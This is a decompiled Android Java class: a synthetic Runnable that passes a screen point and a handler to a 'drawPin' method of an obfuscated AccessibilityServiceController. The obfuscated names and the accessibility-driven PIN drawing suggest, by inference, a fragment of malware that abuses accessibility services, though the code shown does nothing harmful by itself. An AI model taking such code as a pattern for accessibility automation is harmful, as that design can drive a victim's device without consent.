/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.graphics.Point
 *  android.os.Handler
 */
package linker.resourcer.encoder;

import android.graphics.Point;
import android.os.Handler;
import linker.resourcer.encoder.AccessibilityServiceController;

public final class AccessibilityServiceController$$ExternalSyntheticLambda15
implements Runnable {
    public final Point f$0;
    public final AccessibilityServiceController f$1;
    public final Handler f$2;

    public /* synthetic */ AccessibilityServiceController$$ExternalSyntheticLambda15(Point point, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Handler handler) {
        this.f$0 = point;
        this.f$1 = jhvbzpdwpbqgticwdxuva2;
        this.f$2 = handler;
    }

    @Override
    public final void run() {
        AccessibilityServiceController.lambda$drawPin$12(this.f$0, this.f$1, this.f$2);
    }
}

